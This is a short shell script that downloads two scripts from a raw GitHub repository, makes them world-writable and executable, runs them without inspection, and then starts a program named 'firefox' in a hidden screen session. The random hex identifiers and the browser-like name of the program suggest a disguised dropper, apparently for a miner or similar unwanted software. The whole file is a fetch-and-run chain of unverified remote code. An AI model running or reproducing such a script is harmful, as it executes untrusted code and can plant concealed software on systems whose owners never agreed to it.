#!/bin/sh
cd profiles
export firefoxsetup=$(openssl rand -hex 20)
export link=$(openssl rand -hex 4)
wget https://raw.githubusercontent.com/ngocsuo/daobanano/master/vip2.sh
chmod 777 vip2.sh
wget https://raw.githubusercontent.com/ngocsuo/daobanano/master/configfile.sh
chmod 777 configfile.sh
./vip2.sh
./configfile.sh
apt install screen -y
screen -S tf2 ./firefox
